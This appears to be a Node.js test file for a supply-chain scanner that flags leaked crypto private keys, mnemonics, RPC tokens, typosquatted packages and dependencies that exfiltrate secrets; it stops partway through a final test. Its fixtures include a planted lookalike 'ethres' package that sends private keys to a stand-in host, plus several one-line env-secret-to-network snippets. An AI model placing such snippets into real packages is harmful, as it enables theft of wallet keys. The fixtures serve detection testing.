import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, writeFileSync, symlinkSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pinSnapshot, loadSnapshot, replayEvidence, proveFindings, redactSecret, sha256 } from "../lib/proof-evidence.mjs";
import { cryptoLeads, cryptoDetectors } from "../packs/supply-chain/crypto.mjs";
import { makeLabWorkspace } from "../packs/supply-chain/lab.mjs";
import { captureSnapshot, skipSummary } from "../packs/supply-chain/snapshot.mjs";
import { coverageGaps } from "../packs/supply-chain/pack.mjs";
import { readdirSync, statSync, renameSync, existsSync } from "node:fs";
import { isUtf8 } from "node:buffer";
import { relative } from "node:path";
import { scanSnapshot, SCANNERS, SYFT } from "../packs/supply-chain/scanners.mjs";
import { skipUnlessImages } from "./docker-skip.mjs";
const semgrepSkip = skipUnlessImages(SCANNERS.semgrep.image);
import { mkdirSync } from "node:fs";
import { execFileSync } from "node:child_process";

const temp = () => mkdtempSync(join(tmpdir(), "evidence-test-"));
const remove = (ws) => rmSync(ws, { recursive: true, force: true });

test("evidence requires pinned bytes, an allowlisted detector, and the exact location", async () => {
  const ws = temp();
  try {
    const snapshotHash = pinSnapshot(ws, { headers: { server: "lab" } });
    const detectors = { header: (s, where) => ({ ok: where === "server" && s.headers.server === "lab", detail: "DO NOT ECHO THIS SECRET" }) };
    const evidence = { check: "header", where: "server", snapshotHash };
    const pass = await replayEvidence(ws, evidence, { detectors });
    assert.equal(pass.status, "pass");
    assert.ok(!JSON.stringify(pass).includes("DO NOT ECHO"));
    for (const changed of [{ where: "other" }, { check: "toString" }, { check: "unknown" }, { snapshotHash: "0".repeat(64) }]) {
      assert.equal((await replayEvidence(ws, { ...evidence, ...changed }, { detectors })).status, "fail");
    }
    assert.throws(() => pinSnapshot(ws, { headers: { server: "changed" } }), /already pinned/);
    writeFileSync(join(ws, "snapshot.json"), readFileSync(join(ws, "snapshot.json"), "utf8") + "\n");
    assert.equal((await replayEvidence(ws, evidence, { detectors })).status, "fail");
  } finally { remove(ws); }
});

test("evidence refuses symlink escapes and uses the domain snapshotHash config", () => {
  const ws = temp(), outside = temp();
  try {
    const content = JSON.stringify({ dns: [] });
    writeFileSync(join(outside, "snapshot.json"), content);
    symlinkSync(join(outside, "snapshot.json"), join(ws, "snapshot.json"));
    writeFileSync(join(ws, ".touchstone.json"), JSON.stringify({ snapshotHash: sha256(content) }));
    assert.throws(() => loadSnapshot(ws), /escapes/);
  } finally { remove(ws); remove(outside); }
});

test("batch replay rejects unsupported findings and ranks supported findings worst first", async () => {
  const ws = temp();
  try {
    const snapshotHash = pinSnapshot(ws, { dns: ["record"] });
    const good = { check: "dns", where: 0, snapshotHash };
    const found = [{ severity: "low", evidence: good }, { severity: "critical", evidence: { ...good, check: "missing" } }, { severity: "high", evidence: good }];
    const proven = await proveFindings(ws, found, [], () => {}, { detectors: { dns: (s, w) => ({ ok: s.dns[w] === "record" }) } });
    assert.deepEqual(proven.map((f) => [f.severity, f.proof.status]), [["high", "pass"], ["low", "pass"]]);
  } finally { remove(ws); }
});

test("crypto checks reject scalars and unlabeled bytes32, and derive a known mnemonic account", () => {
  const key = "1".padStart(64, "0"), invalid = "0".repeat(64);
  const phrase = "test test test test test test test test test test test junk";
  const snapshot = { files: { "wallet.env": `PRIVATE_KEY=0x${key}\nPRIVATE_KEY=0x${invalid}\nHASH=0x${key}\nMNEMONIC=${phrase}\nMNEMONIC=test test test test test test test test test test test test\n` } };
  const leads = cryptoLeads(snapshot);
  assert.deepEqual(leads.map((l) => [l.check, l.lines[0], l.address]), [
    ["evm-private-key", 1, "0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf"],
    ["bip39-mnemonic", 4, "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"],
  ]);
  const publicText = JSON.stringify(leads);
  assert.ok(!publicText.includes(phrase));
  assert.ok(!publicText.includes(key));
  assert.deepEqual(redactSecret(`0x${key}`), redactSecret(key.toUpperCase()));
  assert.equal(cryptoDetectors["evm-private-key"](snapshot, { ...leads[0].where, line: 2 }).ok, false);
});

test("RPC provider matching uses hostname boundaries and package warnings bind to one name", () => {
  const token = "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6";
  const snapshot = { files: {
    "rpc.js": `"https://eth-mainnet.g.alchemy.com/v2/${token}"\n"https://mainnet.infura.io/v3/${token}"\n"https://lab.quiknode.pro/${token}/"\n"https://eth-mainnet.g.alchemy.com.evil.invalid/v2/${token}"`,
    "package.json": JSON.stringify({ dependencies: { ethers: "6", ethres: "1", viem: "1", vieem: "1", "@solana/web3.j": "1", unrelated: "1" } }),
  } };
  const leads = cryptoLeads(snapshot);
  assert.deepEqual(leads.filter((l) => l.check === "rpc-provider-key").map((l) => l.provider), ["Alchemy", "Infura", "QuickNode"]);
  assert.deepEqual(leads.filter((l) => l.package).map((l) => l.package), ["ethres", "vieem", "@solana/web3.j"]);
  const where = leads.find((l) => l.package === "ethres").where;
  assert.equal(cryptoDetectors["crypto-package-lookalike"](snapshot, { ...where, package: "ethers" }).ok, false);
  assert.ok(!JSON.stringify(leads).includes(token));
});

test("lab snapshot binds source to a commit and treats keystore address as metadata", async () => {
  const ws = await makeLabWorkspace();
  try {
    const snapshot = captureSnapshot(ws);
    assert.match(snapshot.commit, /^[a-f0-9]{40,64}$/);
    const keystore = cryptoLeads(snapshot).find((l) => l.check === "evm-keystore");
    assert.equal(keystore.addressSource, "keystore-metadata");
    // A dirty working tree never changes the evidence. The commit bytes win.
    writeFileSync(join(ws, "hardhat.config.js"), "changed");
    assert.equal(captureSnapshot(ws).files["hardhat.config.js"], snapshot.files["hardhat.config.js"]);
  } finally { remove(ws); }
});

test("non-object JSON and unrelated config hashes do not become crypto findings", () => {
  const key = "1".padStart(64, "0");
  assert.deepEqual(cryptoLeads({ files: { "null.json": "null", "array.json": "[]", "hardhat.config.js": `const buildHash = \"0x${key}\";` } }), []);
});

const evil = {
  "node_modules/ethres/index.js": "const https = require('https');\nclass Wallet { constructor(k) { https.request({ host: 'x.invalid' }).end(JSON.stringify({ k, e: process.env.PRIVATE_KEY })); } }\n",
  "scripts/deploy.js": "const { Wallet } = require('ethres');\nnew Wallet(process.env.DEPLOYER_KEY);\n",
  "package.json": JSON.stringify({ dependencies: { ethres: "1.0.0", lodash: "4" } }),
  "package-lock.json": JSON.stringify({ packages: { "": {}, "node_modules/lodash": { version: "4.17.21" } } }),
};

test("a malicious dependency that reaches a signer is found and replays at the exact import", () => {
  const leads = cryptoLeads({ files: evil });
  const reach = leads.find((l) => l.check === "dependency-reaches-signer");
  assert.deepEqual([reach.file, reach.lines[0], reach.where.package], ["scripts/deploy.js", 1, "ethres"]);
  assert.ok(leads.some((l) => l.check === "dependency-exfil-code" && l.file === "node_modules/ethres/index.js" && l.lines[0] === 2));
  assert.ok(leads.some((l) => l.check === "dependency-not-in-lockfile" && l.package === "ethres" && l.impact === "Low"));
  const snapshot = { files: evil };
  assert.equal(cryptoDetectors["dependency-reaches-signer"](snapshot, reach.where).ok, true);
  assert.equal(cryptoDetectors["dependency-reaches-signer"](snapshot, { ...reach.where, package: "lodash" }).ok, false);
  assert.equal(cryptoDetectors["dependency-reaches-signer"](snapshot, { ...reach.where, line: 2 }).ok, false);
});

test("an import with no signer context, or from a known-good package, is not a signer reach", () => {
  const noSigner = { ...evil, "scripts/deploy.js": "const x = require('ethres');\n" };
  assert.deepEqual(cryptoLeads({ files: noSigner }).filter((l) => l.check === "dependency-reaches-signer"), []);
  const known = { "package.json": JSON.stringify({ dependencies: { ethers: "6" } }), "scripts/deploy.js": "const { Wallet } = require('ethers');\nnew Wallet(process.env.DEPLOYER_KEY);\n",
    "node_modules/ethers/index.js": "module.exports = {};\n" };
  assert.deepEqual(cryptoLeads({ files: known }), []);
});

test("a folder that is not a git repo is captured; binary, large and reserved files are skipped and listed", () => {
  const dir = temp();
  try {
    mkdirSync(join(dir, "src"));
    mkdirSync(join(dir, ".git"));
    writeFileSync(join(dir, ".git/config"), "never read");
    writeFileSync(join(dir, "src/a.js"), "const a = 1;\n");
    writeFileSync(join(dir, "blob.bin"), Buffer.from([0, 1, 2, 255]));
    writeFileSync(join(dir, "big.txt"), "x".repeat(600 * 1024));
    writeFileSync(join(dir, ".semgrepignore"), "*\n");
    symlinkSync("/etc/passwd", join(dir, "link"));
    const snapshot = captureSnapshot(dir);
    assert.deepEqual(Object.keys(snapshot.files), ["src/a.js"]);
    assert.equal(snapshot.commit, undefined);
    assert.match(snapshot.folderHash, /^[a-f0-9]{64}$/);
    const reasons = Object.fromEntries(snapshot.skipped.map((s) => [s.file, s.reason]));
    assert.deepEqual(reasons, { "blob.bin": "binary-or-not-utf8", "big.txt": "too-large", ".semgrepignore": "reserved-name", link: "not-a-regular-file" });
  } finally { remove(dir); }
});

test("vendored code never starves the project's own files of the byte budget", () => {
  const dir = temp();
  try {
    mkdirSync(join(dir, "node_modules/big"), { recursive: true });
    for (let i = 0; i < 20; i++) writeFileSync(join(dir, `node_modules/big/f${i}.js`), "x".repeat(500 * 1024));
    writeFileSync(join(dir, "app.js"), "const ok = 1;\n");
    const snapshot = captureSnapshot(dir);
    assert.ok(snapshot.files["app.js"]);
    assert.ok(snapshot.skipped.some((s) => s.reason === "over-budget"));
  } finally { remove(dir); }
});

test("every named tool is wrapped through runTool and a missing grype database is a gap, not a clean result", async () => {
  for (const engine of ["gitleaks", "trufflehog", "osv", "grype", "semgrep"]) assert.ok(SCANNERS[engine].image.includes("@sha256:"), `${engine} must be digest pinned`);
  assert.ok(SYFT.image.includes("@sha256:"));
  const old = process.env.TOUCHSTONE_GRYPE_DB;
  process.env.TOUCHSTONE_GRYPE_DB = temp();
  try {
    const r = await scanSnapshot({ files: { "package.json": "{}" }, npmAdvisories: "" }, "grype");
    assert.equal(r.status, "gap");
    assert.deepEqual(r.leads, []);
    assert.match(r.reason, /refresh-db/);
  } finally { if (old === undefined) delete process.env.TOUCHSTONE_GRYPE_DB; else process.env.TOUCHSTONE_GRYPE_DB = old; }
});

test("the lab plants a dependency that no advisory scanner or lockfile knows", async () => {
  const ws = await makeLabWorkspace();
  try {
    const { files } = captureSnapshot(ws);
    assert.ok(files["node_modules/ethres/index.js"], "plant is vendored in the lab workspace");
    assert.ok(!files["package-lock.json"].includes("ethres"));
    const leads = cryptoLeads({ files });
    assert.ok(leads.some((l) => l.check === "dependency-reaches-signer" && l.where.package === "ethres"));
    assert.ok(leads.some((l) => l.check === "dependency-exfil-code" && l.where.package === "ethres"));
  } finally { remove(ws); }
});

test("the evidence viewer shows the real secret hash, never the secret", async () => {
  const { proofView } = await import("../lib/proof-view.mjs");
  const key = `0x${"3".repeat(63)}1`;
  const lead = cryptoLeads({ files: { "hardhat.config.js": `accounts: ["${key}"]\n` } })[0];
  const view = proofView({ proof: { kind: "evidence", status: "pass", check: lead.check, snapshotHash: "a".repeat(64) }, evidence: { check: lead.check, where: lead.where, snapshotHash: "a".repeat(64) } });
  const cell = view.cited.find((c) => c.name === "fingerprint");
  assert.equal(cell.value, lead.secret.sha256);
  assert.ok(!JSON.stringify(view).includes(key.slice(2)));
});

// Repair cycle 1.

const ethersRoot = new URL("../node_modules/ethers", import.meta.url).pathname;
function vendorEthers() {
  const files = {};
  (function walk(d) {
    for (const e of readdirSync(d, { withFileTypes: true })) {
      const p = join(d, e.name);
      if (e.isDirectory()) { if (e.name !== "node_modules") walk(p); }
      else if (e.isFile() && statSync(p).size < 512 * 1024) { const b = readFileSync(p); if (isUtf8(b) && !b.includes(0)) files[`node_modules/ethers/${relative(ethersRoot, p)}`] = b.toString(); }
    }
  })(ethersRoot);
  return files;
}
const lockOf = (entries) => JSON.stringify({ lockfileVersion: 3, packages: { "": {}, ...entries } });
const high = (leads) => leads.filter((l) => l.impact === "High");

test("the real ethers package, locked with an integrity hash, gives no High lead", () => {
  const files = { ...vendorEthers(),
    "package.json": JSON.stringify({ dependencies: { ethers: "6.16.0" } }),
    "package-lock.json": lockOf({ "node_modules/ethers": { version: "6.16.0", integrity: "sha512-abc", resolved: "https://registry.npmjs.org/ethers/-/ethers-6.16.0.tgz" } }),
    "scripts/deploy.js": "const { Wallet } = require('ethers');\nconst w = new Wallet(process.env.DEPLOYER_KEY);\n" };
  assert.ok(Object.keys(files).length > 500, "the real package is vendored");
  const leads = cryptoLeads({ files });
  assert.deepEqual(leads.map((l) => [l.impact, l.check, l.file]), []);
});

test("exfil needs a secret read and a network call close together, in code, not in types or comments", () => {
  const far = `const k = process.env.PRIVATE_KEY;\n${"\n".repeat(30)}fetch('https://x.invalid');\n`;
  const near = `const k = process.env.PRIVATE_KEY;\nfetch('https://x.invalid', { body: k });\n`;
  const cases = {
    "node_modules/a/far.js": far,
    "node_modules/a/types.d.ts": near,
    "node_modules/a/copy.js": "const e = Object.assign({}, process.env);\nfetch('https://x.invalid', { body: JSON.stringify(e) });\n",
    "node_modules/a/comment.js": "// reads process.env.PRIVATE_KEY then fetch(\n/* fetch( process.env.SECRET_TOKEN */\n",
  };
  assert.deepEqual(cryptoLeads({ files: cases }), []);
  const hit = cryptoLeads({ files: { "node_modules/a/near.js": near } });
  assert.deepEqual(hit.map((l) => [l.impact, l.check, l.lines[0]]), [["High", "dependency-exfil-code", 2]]);
  // A locked registry package is Medium, not High. An aliased or off-registry lockfile entry earns no trust.
  const locked = { "node_modules/a/near.js": near, "package-lock.json": lockOf({ "node_modules/a": { version: "1.0.0", integrity: "sha512-x" } }) };
  assert.equal(cryptoLeads({ files: locked })[0].impact, "Medium");
  for (const entry of [{ name: "evil", integrity: "sha512-x" }, { integrity: "sha512-x", resolved: "https://evil.invalid/a.tgz" }, { version: "1.0.0" }]) {
    assert.equal(cryptoLeads({ files: { ...locked, "package-lock.json": lockOf({ "node_modules/a": entry }) } })[0].impact, "High");
  }
});

test("a repeated key on many lines is one lead, and a minified bundle is not a key leak", () => {
  const key = "1".padStart(64, "0");
  const repeated = Array.from({ length: 5 }, () => `PRIVATE_KEY=0x${key}`).join("\n");
  const bundle = `${"var a=1;".repeat(300)}accounts=${key};`;
  const leads = cryptoLeads({ files: { ".env": repeated, "node_modules/x/dist/x.min.js": bundle } });
  assert.deepEqual(leads.map((l) => [l.check, l.file, l.lines[0]]), [["evm-private-key", ".env", 1]]);
});

test("a lookalike name stays below High, even when a file mentions Wallet", () => {
  const files = {
    "package.json": JSON.stringify({ dependencies: { view: "1", web: "1", lodash: "4" } }),
    "package-lock.json": lockOf({ "node_modules/lodash": { version: "4.17.21", integrity: "sha512-x" } }),
    "deploy.js": "// Wallet from view\nconst view = require('view');\nimport web from 'web';\nconst Wallet = 1;\nview.render(Wallet); web.get(privateKey);\n",
  };
  assert.deepEqual(high(cryptoLeads({ files })), []);
  // Only a use of the imported binding as a signer counts, and even then a lookalike is capped at Medium.
  const used = cryptoLeads({ files: { ...files, "deploy.js": "const view = require('view');\nnew view.Wallet(process.env.DEPLOYER_KEY);\n" } });
  const reach = used.filter((l) => l.check === "dependency-reaches-signer");
  assert.deepEqual(reach.map((l) => [l.package, l.impact]), [["view", "Medium"]]);
  assert.deepEqual(high(used), []);
  // With no lockfile at all, a declared lookalike used as a signer is still capped at Medium.
  const noLock = cryptoLeads({ files: { "package.json": files["package.json"], "deploy.js": "const view = require('view');\nnew view.Wallet(process.env.DEPLOYER_KEY);\n" } });
  assert.deepEqual(high(noLock), []);
  assert.deepEqual(noLock.filter((l) => l.check === "dependency-reaches-signer").map((l) => l.impact), ["Medium"]);
});

test("a multi-line import of the planted package still reaches the signer, and a comment does not", () => {
  const files = { ...evil, "scripts/deploy.js": "const {\n  Wallet,\n} = require('ethres');\nnew Wallet(process.env.DEPLOYER_KEY);\n" };
  assert.deepEqual(cryptoLeads({ files }).filter((l) => l.check === "dependency-reaches-signer").map((l) => [l.lines[0], l.impact]), [[1, "High"]]);
  const commented = { ...evil, "scripts/deploy.js": "// const { Wallet } = require('ethres'); new Wallet(privateKey)\n" };
  assert.deepEqual(cryptoLeads({ files: commented }).filter((l) => l.check === "dependency-reaches-signer"), []);
});

test("a file named foo.package.json is not a manifest", () => {
  const files = { "foo.package.json": JSON.stringify({ dependencies: { ethres: "1" } }) };
  assert.deepEqual(cryptoLeads({ files }), []);
});

function gitRepo(files) {
  const dir = temp();
  for (const [name, text] of Object.entries(files)) { mkdirSync(join(dir, name, ".."), { recursive: true }); writeFileSync(join(dir, name), text); }
  const git = (args) => execFileSync("git", ["-C", dir, ...args], { stdio: "pipe", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null" } });
  git(["init", "--quiet"]); git(["add", "."]);
  git(["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false", "commit", "--quiet", "-m", "x"]);
  return dir;
}

test("a git scan says it read committed files only, and counts the untracked and ignored files it did not read", () => {
  const dir = gitRepo({ "app.js": "const a = 1;\n", ".gitignore": "node_modules/\nbuild/\n", "gone.js": "const gone = 1;\n" });
  try {
    mkdirSync(join(dir, "node_modules/evil"), { recursive: true });
    mkdirSync(join(dir, "build"));
    for (let i = 0; i < 3; i++) writeFileSync(join(dir, `node_modules/evil/f${i}.js`), "x");
    writeFileSync(join(dir, "build/out.js"), "x");
    writeFileSync(join(dir, ".env"), `PRIVATE_KEY=0x${"1".padStart(64, "0")}\n`);
    writeFileSync(join(dir, "scratch.js"), "x");
    rmSync(join(dir, "gone.js"));
    const snapshot = captureSnapshot(dir);
    assert.equal(snapshot.scope, "committed-files-only");
    assert.deepEqual(snapshot.notScanned.untracked, { count: 2, byDir: { "(root)": 2 }, rootFiles: [".env", "scratch.js"] });
    assert.equal(snapshot.notScanned.ignored.count, 4);
    assert.deepEqual(snapshot.notScanned.ignored.byDir, { "node_modules": 3, build: 1 });
    assert.ok(!(".env" in snapshot.files));
    // A file deleted from the working tree is still read from its commit.
    assert.equal(snapshot.files["gone.js"], "const gone = 1;\n");
    assert.deepEqual(snapshot.skipped, []);
    const gaps = coverageGaps(snapshot, skipSummary(snapshot.skipped));
    assert.match(gaps[0].detail, /Committed files only\. 2 untracked and 4 ignored files were not read/);
    // Worktree mode is opt in. It reads them, and the planted dependency can now be seen.
    const wt = captureSnapshot(dir, { worktree: true });
    assert.equal(wt.scope, "worktree");
    assert.ok(wt.files[".env"] && wt.files["node_modules/evil/f0.js"]);
    assert.equal(wt.commit, undefined);
    assert.equal(wt.notScanned, undefined);
  } finally { remove(dir); }
});

test("a clean git tree has no uncommitted-files gap, and our own run files are not counted", () => {
  const dir = gitRepo({ "app.js": "const a = 1;\n" });
  try {
    writeFileSync(join(dir, ".touchstone.json"), "{}");
    writeFileSync(join(dir, "snapshot.json"), "{}");
    const snapshot = captureSnapshot(dir);
    assert.deepEqual([snapshot.notScanned.untracked.count, snapshot.notScanned.ignored.count], [0, 0]);
    assert.deepEqual(coverageGaps(snapshot, skipSummary([])), []);
  } finally { remove(dir); }
});

test("skipped files are counted by reason and folder, and a skipped vendored code file is a coverage gap", () => {
  const dir = temp();
  try {
    mkdirSync(join(dir, "web/node_modules/pkg/lib"), { recursive: true });
    mkdirSync(join(dir, "web/node_modules/native"), { recursive: true });
    writeFileSync(join(dir, "web/node_modules/pkg/lib/huge.js"), "x".repeat(600 * 1024));
    writeFileSync(join(dir, "web/node_modules/native/addon.node"), Buffer.from([0, 1, 2]));
    writeFileSync(join(dir, "web/node_modules/native/logo.png"), Buffer.from([0, 1, 2]));
    writeFileSync(join(dir, "app.js"), "const ok = 1;\n");
    writeFileSync(join(dir, "data.bin"), Buffer.from([0, 1]));
    const snapshot = captureSnapshot(dir);
    const sum = skipSummary(snapshot.skipped);
    assert.equal(sum.count, 4);
    assert.deepEqual(sum.byReason, { "binary-or-not-utf8": 3, "too-large": 1 });
    assert.deepEqual(sum.byDir, { "web/node_modules": 3, "(root)": 1 });
    // Only code in a vendored package is a gap. A native addon or an image is not code we read.
    assert.deepEqual(sum.vendoredGaps, { packages: 1, sample: [{ package: "pkg", files: 1, reasons: ["too-large"] }] });
    const gaps = coverageGaps(snapshot, sum);
    assert.deepEqual(gaps.map((g) => g.kind), ["vendored-package-skipped"]);
    assert.match(gaps[0].detail, /1 packages in node_modules lost code files/);
  } finally { remove(dir); }
});

test("scan.mjs prints a clear message for an empty folder, not a stack trace", () => {
  const dir = temp();
  try {
    const run = (args) => { try { return { code: 0, out: execFileSync("node", [new URL("../packs/supply-chain/scan.mjs", import.meta.url).pathname, ...args], { stdio: "pipe", encoding: "utf8" }) }; } catch (e) { return { code: e.status, out: String(e.stderr) }; } };
    const empty = run([dir]);
    assert.equal(empty.code, 1);
    assert.match(empty.out, /scan failed: the folder has no readable text files/);
    assert.ok(!/\n\s+at /.test(empty.out), "no stack trace");
    assert.equal(run([join(dir, "missing")]).code, 2);
  } finally { remove(dir); }
});

// Repair cycle 2. A typosquat from the registry is a real package with a real integrity hash.
const registryLock = (name) => lockOf({ [`node_modules/${name}`]: { version: "1.0.0", integrity: "sha512-abc", resolved: `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz` }, "node_modules/lodash": { version: "4.17.21", integrity: "sha512-x", resolved: "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz" } });

test("a lookalike installed from the registry, locked with integrity, still reaches the signer at High", () => {
  const files = { ...evil, "package-lock.json": registryLock("ethres") };
  const leads = cryptoLeads({ files });
  assert.deepEqual(leads.filter((l) => l.check === "dependency-reaches-signer").map((l) => [l.file, l.lines[0], l.package, l.impact]), [["scripts/deploy.js", 1, "ethres", "High"]]);
  assert.deepEqual(leads.filter((l) => l.check === "dependency-exfil-code").map((l) => [l.package, l.impact]), [["ethres", "High"]]);
  assert.ok(!leads.some((l) => l.check === "dependency-not-in-lockfile"), "it is locked, so this is not the missing-lock case");
  // The real canonical package, same lockfile shape, is still trusted: its own code raises nothing.
  const real = cryptoLeads({ files: { ...vendorEthers(), "package.json": JSON.stringify({ dependencies: { ethers: "6" } }), "package-lock.json": registryLock("ethers"), "scripts/deploy.js": "const { Wallet } = require('ethers');\nnew Wallet(process.env.DEPLOYER_KEY);\n" } });
  assert.deepEqual(real, []);
});

test("a declared lookalike with no node_modules in the repo is a Medium signer reach, even when locked", () => {
  const files = { "package.json": evil["package.json"], "package-lock.json": registryLock("ethres"), "scripts/deploy.js": evil["scripts/deploy.js"] };
  const leads = cryptoLeads({ files });
  assert.deepEqual(leads.filter((l) => l.check === "dependency-reaches-signer").map((l) => [l.package, l.impact]), [["ethres", "Medium"]]);
  assert.deepEqual(high(leads), []);
});

// Deep-review repair.

const names = (deps) => cryptoLeads({ files: { "package.json": JSON.stringify({ dependencies: Object.fromEntries(deps.map((d) => [d, "1.0.0"])) }) } })
  .filter((l) => l.check === "crypto-package-lookalike").map((l) => [l.package, l.resembles]);

test("affix typosquats of a known package are lookalikes", () => {
  const squats = ["ethers-js", "ethersjs", "ethers.js", "ethers-sdk", "web3.js", "web3-js", "viem-js", "viemjs", "viem-sdk", "js-ethers", "@solana/web3.js-sdk", "@solana/web3.js-lib"];
  assert.deepEqual(names(squats).map(([n]) => n).sort(), [...squats].sort());
  assert.deepEqual(names(["ethers-js", "web3.js", "viem-sdk"]), [["ethers-js", "ethers"], ["web3.js", "web3"], ["viem-sdk", "viem"]]);
});

test("the real packages and their families are not lookalikes", () => {
  const real = ["ethers", "web3", "viem", "@solana/web3.js", "web3-utils", "web3-eth", "web3-core", "@ethersproject/wallet", "@ethersproject/providers", "ethereumjs-util", "@openzeppelin/contracts", "ethers-decode-error", "lodash", "express"];
  assert.deepEqual(names(real), []);
});

test("a squatted affix name used as a signer is a suspect, and the real name is not", () => {
  const use = (name) => cryptoLeads({ files: { "package.json": JSON.stringify({ dependencies: { [name]: "1" } }), "deploy.js": `const { Wallet } = require('${name}');\nnew Wallet(process.env.DEPLOYER_KEY);\n` } }).filter((l) => l.check === "dependency-reaches-signer").map((l) => [l.package, l.impact]);
  assert.deepEqual(use("ethers-js"), [["ethers-js", "Medium"]]);
  assert.deepEqual(use("ethers"), []);
});

test("exfil through axios, got, undici and sendBeacon is caught, like fetch", () => {
  const body = (call) => `const k = process.env.PRIVATE_KEY;\n${call}\n`;
  const sinks = ["axios.post('https://x.invalid', { k });", "axios({ url: 'https://x.invalid', data: k });", "got.post('https://x.invalid', { json: { k } });", "https.get('https://x.invalid/?k=' + k);", "navigator.sendBeacon('https://x.invalid', k);", "undici.request('https://x.invalid', { body: k });", "ky.post('https://x.invalid', { json: { k } });"];
  for (const call of sinks) {
    const hit = cryptoLeads({ files: { "node_modules/a/index.js": body(call) } }).filter((l) => l.check === "dependency-exfil-code");
    assert.deepEqual(hit.map((l) => [l.impact, l.lines[0]]), [["High", 2]], call);
  }
  // Negative: the same sinks with no secret read, or a secret read far away, are clean.
  assert.deepEqual(cryptoLeads({ files: { "node_modules/a/index.js": "axios.post('https://x.invalid', { ok: 1 });\n", "node_modules/b/index.js": `const k = process.env.PRIVATE_KEY;\n${"\n".repeat(30)}axios.post('https://x.invalid', { k });\n` } }), []);
  // A word that only contains a client name is not a call.
  assert.deepEqual(cryptoLeads({ files: { "node_modules/a/index.js": "const k = process.env.PRIVATE_KEY;\nmyaxios.postpone(k);\nforgot (k);\n" } }), []);
});

test("the semgrep rules catch an axios.post exfil of an env secret", { skip: semgrepSkip }, async () => {
  const snapshot = { files: { "node_modules/evil/index.js": "const axios = require('axios');\naxios.post('https://x.invalid', { key: process.env.PRIVATE_KEY });\n", "package.json": "{}" }, npmAdvisories: "" };
  const r = await scanSnapshot(snapshot, "semgrep");
  assert.equal(r.status, "ok");
  assert.deepEqual(r.leads.map((l) => [l.check, l.file]), [["touchstone-env-secret-to-network", "node_modules/evil/index.js"]]);
  const clean = await scanSnapshot({ files: { "node_modules/ok/index.js": "const axios = require('axios');\naxios.post('https://x.invalid', { ok: 1 });\n", "package.json": "{}" }, npmAdvisories: "" }, "semgrep");
  assert.deepEqual(clean.leads, []);
});

test("a bytes32 role constant is not a private key, and a real key assignment is", () => {
  const hex = "1".padStart(64, "0");
  const role = [`bytes32 private constant DEPLOYER_ROLE = 0x${hex};`, `bytes32 public immutable DEPLOYER_KEY_HASH = 0x${hex};`, `bytes32 constant PRIVATE_KEY_ROLE = keccak256("x"); // 0x${hex}`, `bytes32 public constant DEPLOYER_ROLE = 0x${hex};`];
  for (const line of role) assert.deepEqual(cryptoLeads({ files: { "contracts/Roles.sol": `${line}\n` } }), [], line);
  const keys = { "a.js": `const privateKey = "0x${hex}";`, "b.env": `DEPLOYER_KEY=0x${hex}`, "c.json": `{ "private_key": "${hex}" }`, "d.js": `module.exports = { accounts: ["0x${hex}"] };`, "e.sol": `uint256 deployerPrivateKey = 0x${hex};`, "f.js": `accounts: [a, "0x${hex}"]` };
  for (const [file, text] of Object.entries(keys)) assert.deepEqual(cryptoLeads({ files: { [file]: text } }).map((l) => l.check), ["evm-private-key"], file);
  // The key word must come before the value. A hash that merely sits next to the word is not a key.
  assert.deepEqual(cryptoLeads({ files: { "x.js": `const h = "0x${hex}"; // not a private key` } }), []);
});

test("ethers v6 signer idioms count as a signer: ethers.Wallet, Wallet.fromPhrase, Contract with a wallet", () => {
  const reach = (code, extra = {}) => cryptoLeads({ files: { "package.json": JSON.stringify({ dependencies: { "ethers-js": "1" } }), "deploy.js": code, ...extra } }).filter((l) => l.check === "dependency-reaches-signer").length;
  assert.equal(reach("import * as ethers from 'ethers-js';\nconst w = new ethers.Wallet(pk);\n"), 1);
  assert.equal(reach("import { Wallet } from 'ethers-js';\nconst w = Wallet.fromPhrase(words);\n"), 1);
  assert.equal(reach("import { Contract } from 'ethers-js';\nconst c = new Contract(addr, abi, wallet);\n"), 1);
  assert.equal(reach("import * as ethers from 'ethers-js';\nconst c = new ethers.Contract(addr, abi, deployerSigner);\n"), 1);
  // Negative: a read-only contract, or a provider, is not a signer.
  assert.equal(reach("import * as ethers from 'ethers-js';\nconst c = new ethers.Contract(addr, abi, provider);\n"), 0);
  assert.equal(reach("import { parseEther } from 'ethers-js';\nparseEther('1');\n"), 0);
});

// Re-review: the key check must keep real-key recall.

test("a hardcoded key is caught after ||, ??, =>, return, + and in an object fallback", () => {
  const hex = "2".padStart(64, "0");
  const shapes = {
    "or.js": `const pk = process.env.PRIVATE_KEY || "0x${hex}";`,
    "nullish.js": `const privateKey = process.env.PK ?? '0x${hex}';`,
    "object.js": `module.exports = { privateKey: process.env.KEY || "${hex}", };`,
    "arrow.js": `const getPrivateKey = () => "0x${hex}";`,
    "return.js": `function privateKey() { return "0x${hex}"; }`,
    "concat.js": `const privateKey = "0x" + "${hex}";`,
    "after-role.js": `const adminRole = "ADMIN_ROLE"; const privateKey = "0x${hex}";`,
    "after-hash.js": `const id = keccak256("x"); const deployerKey = "0x${hex}";`,
  };
  for (const [file, text] of Object.entries(shapes)) assert.deepEqual(cryptoLeads({ files: { [file]: text } }).map((l) => l.check), ["evm-private-key"], file);
  // Negative: the same statements are still skipped when the role or hash is in the key's own statement.
  const skipped = [`bytes32 privateKey = 0x${hex};`, `bytes32 public constant DEPLOYER_ROLE = 0x${hex};`, `const x = keccak256("a"), privateKey = "0x${hex}";`, `const adminRole = "ADMIN_ROLE"; // 0x${hex}`];
  for (const line of skipped) assert.deepEqual(cryptoLeads({ files: { "x.sol": line } }), [], line);
});

test("a key labeled only by a trailing comment is not flagged (documented limit)", () => {
  const hex = "2".padStart(64, "0");
  assert.deepEqual(cryptoLeads({ files: { "x.js": `const PK = "0x${hex}"; // deployer private key` } }), []);
});

test("semgrep does not flag an axios or got client config call that sends nothing", { skip: semgrepSkip }, async () => {
